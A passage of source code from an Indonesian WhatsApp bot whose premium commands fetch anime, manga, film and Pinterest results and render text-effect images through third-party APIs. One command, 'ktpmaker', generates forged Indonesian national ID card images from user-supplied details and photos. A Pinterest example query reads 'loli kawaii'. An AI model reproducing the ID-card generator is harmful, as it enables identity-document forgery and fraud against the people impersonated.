              ini_txt += `${y} - ${link_dl[y]}\n`
}
}
              buff = await getBuffer(skdl.thumb)
let message = await prepareWAMessageMedia({ image: buff }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: ini_txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}             
         break
case 'lk21':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    sticWait(from)
                    query = args.join(" ")
                    fejfw = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
                    fejfwd = fejfw.result
                    ini_txt = `Title : ${fejfwd.title}\n`
                    ini_txt += `Link : ${fejfwd.link}\n`
                    ini_txt += `Genre : ${fejfwd.genre}\n`
                    ini_txt += `Views : ${fejfwd.views}\n`
                    ini_txt += `Duration : ${fejfwd.duration}\n`
                    ini_txt += `Tahun : ${fejfwd.tahun}\n`
                    ini_txt += `Rating : ${fejfwd.rating}\n`
                    ini_txt += `Desc : ${fejfwd.desc}\n`
                    ini_txt += `Actors : ${fejfwd.actors.join(", ")}\n`
                    ini_txt += `Location : ${fejfwd.location}\n`
                    ini_txt += `Date Release : ${fejfwd.date_release}\n`
                    ini_txt += `Language : ${fejfwd.language}\n`
                    ini_txt += `Link Download : ${fejfwd.link_dl}`
                    eahdw = await getBuffer(fejfwd.thumbnail)
                    await kirbotz.sendMessage(m.chat, { image: eahdw, caption: ini_txt }, { quoted: fakekirbotz})                  
                    break
case 'pinterest':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
sticWait(from)
                    query = args.join(" ")
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${query}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    await kirbotz.sendMessage(m.chat, { image: ini_buffer, caption: '*PINTEREST IMAGE*' }, { quoted: fakekirbotz})                  
                    break
case 'pinterest2':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    sticWait(from)
                    query = args.join(" ")
                    dwxwdw = await fetchJson(`https://api.lolhuman.xyz/api/pinterest2?apikey=${lolkey}&query=${query}`)
                    vdcdns = dwxwdw.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(vdcdns[x])
                        await await kirbotz.sendMessage(m.chat, { image: ini_buffer, caption: '*PINTEREST IMAGE*' }, { quoted: fakekirbotz})                  
                    }
                    break
case 'character':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
sticWait(from)
                    query = args.join(" ")
                    fjwje = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${query}`)
                    fejfqds = fjwje.result
                    ini_txt = `Id : ${fejfqds.id}\n`
                    ini_txt += `Name : ${fejfqds.name.full}\n`
                    ini_txt += `Native : ${fejfqds.name.native}\n`
                    ini_txt += `Favorites : ${fejfqds.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = fejfqds.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${fejfqds.description.replace(/__/g, "_")}`
                    gnejws = await getBuffer(fejfqds.image.large)
                    await kirbotz.sendMessage(m.chat, { image: gnejws, caption: ini_txt }, { quoted: fakekirbotz})                  
                    break
case 'manga':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
sticWait(from)
                    query = args.join(" ")
                    mcndn = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
                    vendks = mcndn.result
                    ini_txt = `Id : ${vendks.id}\n`
                    ini_txt += `Id MAL : ${vendks.idMal}\n`
                    ini_txt += `Title : ${vendks.title.romaji}\n`
                    ini_txt += `English : ${vendks.title.english}\n`
                    ini_txt += `Native : ${vendks.title.native}\n`
                    ini_txt += `Format : ${vendks.format}\n`
                    ini_txt += `Chapters : ${vendks.chapters}\n`
                    ini_txt += `Volume : ${vendks.volumes}\n`
                    ini_txt += `Status : ${vendks.status}\n`
                    ini_txt += `Source : ${vendks.source}\n`
                    ini_txt += `Start Date : ${vendks.startDate.day} - ${vendks.startDate.month} - ${vendks.startDate.year}\n`
                    ini_txt += `End Date : ${vendks.endDate.day} - ${vendks.endDate.month} - ${vendks.endDate.year}\n`
                    ini_txt += `Genre : ${vendks.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${vendks.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${vendks.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = vendks.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${vendks.description}`
                    cehdhw = await getBuffer(vendks.coverImage.large)
                    await kirbotz.sendMessage(m.chat, { image: cehdhw, caption: ini_txt }, { quoted: fakekirbotz})                  
                    break
case 'kusonime':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
             if (args.length == 0) return replyNya(`Example: ${prefix + command} Gotoubun No Hanayome`)
sticWait(from)
             query = args.join(" ")
             fwjf = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
             fsdj = fwjf.result
             ini_txt = `Title : ${fsdj.title}\n`
             ini_txt += `Japanese : ${fsdj.japanese}\n`
             ini_txt += `Genre : ${fsdj.genre}\n`
             ini_txt += `Seasons : ${fsdj.seasons}\n`
             ini_txt += `Producers : ${fsdj.producers}\n`
             ini_txt += `Type : ${fsdj.type}\n`
             ini_txt += `Status : ${fsdj.status}\n`
             ini_txt += `Total Episode : ${fsdj.total_episode}\n`
             ini_txt += `Score : ${fsdj.score}\n`
             ini_txt += `Duration : ${fsdj.duration}\n`
             ini_txt += `Released On : ${fsdj.released_on}\n`
             ini_txt += `Desc : ${fsdj.desc}\n`
             link_dl = fsdj.link_dl
             for (var x in link_dl) {
             ini_txt += `\n${x}\n`
             for (var y in link_dl[x]) {
             ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
             ini_buffer = await getBuffer(fsdj.thumbnail)
let message = await prepareWAMessageMedia({ image: ini_buffer }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: ini_txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}             
         break
case 'anime':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
             if (args.length == 0) return replyNya(`Example: ${prefix + command} Gotoubun No Hanayome`)
sticWait(from)
             query = args.join(" ")
             zcem = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
             zcez = zcem.result
             ini_txt = `Id : ${zcez.id}\n`
             ini_txt += `Id MAL : ${zcez.idMal}\n`
             ini_txt += `Title : ${zcez.title.romaji}\n`
             ini_txt += `English : ${zcez.title.english}\n`
             ini_txt += `Native : ${zcez.title.native}\n`
             ini_txt += `Format : ${zcez.format}\n`
             ini_txt += `Episodes : ${zcez.episodes}\n`
             ini_txt += `Duration : ${zcez.duration} mins.\n`
             ini_txt += `Status : ${zcez.status}\n`
             ini_txt += `Season : ${zcez.season}\n`
             ini_txt += `Season Year : ${zcez.seasonYear}\n`
             ini_txt += `Source : ${zcez.source}\n`
             ini_txt += `Start Date : ${zcez.startDate.day} - ${zcez.startDate.month} - ${zcez.startDate.year}\n`
             ini_txt += `End Date : ${zcez.endDate.day} - ${zcez.endDate.month} - ${zcez.endDate.year}\n`
             ini_txt += `Genre : ${zcez.genres.join(", ")}\n`
             ini_txt += `Synonyms : ${zcez.synonyms.join(", ")}\n`
             ini_txt += `Score : ${zcez.averageScore}%\n`
             ini_txt += `Characters : \n`
             ini_character = zcez.characters.nodes
             for (var x of ini_character) {
             ini_txt += `- ${x.name.full} (${x.name.native})\n`
 }
             ini_txt += `\nDescription : ${zcez.description}`
             mvn = await getBuffer(zcez.coverImage.large)
             let message = await prepareWAMessageMedia({ image: mvn }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: ini_txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}             
break
case 'ceritahoror':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
pqdnw = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
csksw = pqdnw.result
ini_txt = `Title : ${csksw.title}\n`
ini_txt += `Desc : ${csksw.desc}\n`
ini_txt += `Story :\n${csksw.story}\n`
buff = await getBuffer(csksw.thumbnail)
let message = await prepareWAMessageMedia({ image: buff }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: ini_txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'wetglass':
case 'multicolor3d':
case 'luxurygold':
case 'galaxywallpaper':
case 'lighttext':
case 'beautifulflower':
case 'puppycute':
case 'royaltext':
case 'heartshaped':
case 'birthdaycake':
case 'galaxystyle':
case 'hologram3d':
case 'greenneon':
case 'glossychrome':
case 'greenbush':
case 'metallogo':
case 'noeltext':
case 'glittergold':
case 'textcake':
case 'starsnight':
case 'wooden3d':
case 'textbyname':
case 'writegalacy':
case 'galaxybat':
case 'snow3d':
case 'birthdayday':
case 'goldplaybutton':
case 'silverplaybutton':
case 'freefire':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} teks`)
sticWait(from)
ini_txt = args.join(" ")
imagenya = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'neon':
case 'greenneon':
case 'advanceglow':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'holographic':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'natureleaves':
case 'bokeh':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'summersand':
case 'horrorblood':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} Akira`)
sticWait(from)
ini_txt = args.join(" ")
imagenya = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'carbon':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if(!q) return replyNya(`Contoh: ${prefix + command} teks`)
sticWait(from)
dwruw = await getBuffer(`https://ws-production.up.railway.app/api/JavaScript/carbon?code=${q}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: dwruw }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
             if (!q) return reply(`Example : ${prefix + command} KirBotz`) 
             reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             let anu = await maker.textpro(link, q)
                kirbotz.sendMessage(m.chat, { image: { url: anu }, caption: `*Done*` }, { quoted: m })
             }
break
case 'denimembroidery': case 'bracelet': case 'nightmare': case 'artpapercut': case 'neonwriting': case 'airballoon': case 'lovelock': case 'neonsign': case 'cemeterygates':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} teks`)
sticWait(from)
txt1 = args[0]
imagetod = await getBuffer(`https://api.dapuhy.xyz/api/photofunia/${command}?text=${txt1}&apikey=${dapkey}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagetod }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'shadow':
case 'cup':
case 'cup1':
case 'romance':
case 'smoke':
case 'burnpaper':
case 'lovemessage':
case 'undergrass':
case 'love':
case 'coffe':
case 'woodheart':
case 'woodenboard':
case 'summer3d':
case 'wolfmetal':
case 'nature3d':
case 'golderrose':
case 'summernature':
case 'letterleaves':
case 'glowingneon':
case 'fallleaves':
case 'flamming':
case 'carvedwood':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} teks`)
sticWait(from)
txt1 = args[0]
imagenya = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${txt1}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'pornhub':
case 'avenger':
case 'space':
case 'ninjalogo':
case 'marvelstudio':
case 'lionlogo':
case 'wolflogo':
case 'steel3d':
case 'wallgravity':
case 'coolgravity':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} Akira Botz`)
sticWait(from)
txt1 = args[0]
txt2 = args[1]
imagenya = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'ktpmaker':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
sticWait(from)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${lolkey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    kirbotz.sendMessage(m.chat, { image: ini_buffer, caption: `*KTP MAKER*` }, { quoted: fakekirbotz})
                    break
case 'tiktokmaker':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} teks1 teks2`)
sticWait(from)
txt1 = args[0]
txt2 = args[1]
imagenya = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/tiktok?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: imagenya }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'arcade8bit':
case 'battlefield4':
case 'pubg':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} teks1 teks2`)
sticWait(from)
txt1 = args[0]
txt2 = args[1]
